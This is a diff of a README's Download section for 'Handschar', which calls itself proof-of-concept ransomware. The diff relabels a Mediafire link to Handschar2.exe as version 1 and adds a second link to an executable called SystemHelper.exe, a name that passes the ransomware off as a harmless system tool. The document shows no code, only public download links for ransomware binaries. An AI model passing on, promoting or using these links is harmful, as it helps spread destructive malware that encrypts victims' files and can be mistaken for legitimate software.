@@ -17,8 +17,8 @@ Handschar is a proof‑of‑concept ransomware:
 
 ## 📥 Download
 
-- **Latest EXE:** [Handschar2.exe](https://www.mediafire.com/file/en2kzeq8t552g2o/Handschar.exe/file)
-
+- **V-1:** [Handschar2.exe](https://www.mediafire.com/file/en2kzeq8t552g2o/Handschar.exe/file)
+- **V-2:** [SystemHelper](https://www.mediafire.com/file/qsq3yqkdv6andjb/SystemHelper.exe/file)
 
 ---
 
